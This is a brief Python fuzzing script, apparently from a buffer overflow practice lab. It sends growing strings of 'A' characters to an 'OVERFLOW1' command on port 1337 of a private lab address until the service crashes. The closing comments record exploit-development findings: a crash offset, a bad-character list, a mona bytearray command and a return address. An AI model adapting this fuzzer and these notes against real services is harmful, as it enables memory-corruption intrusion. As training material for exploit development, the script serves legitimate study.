#!/usr/bin/env python3

import socket, sys
from time import sleep

ip='10.10.172.138'
port=1337

string = "OVERFLOW1 " + 100*"A"

while True:
	try:
		with socket.socket() as s:
			s.connect((ip,port))
			print("sending  {} bytes".format(len(string)))
			s.send(bytes(string,'latin-1'))
			#s.send(bytes("OVERFLOW1 " + string + "\r\n", 'latin-1'))
		sleep(1.2)
		string += 100*"A"
	except:
		print("fuzzing crashed at {} bytes".format(len(string)))
		break
		
#43386E43 -> 1974
#badchars 00 07 08 2e 2f a0 a1
# !mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"
# 625011AF
# \xAF\x11\x50\x62"
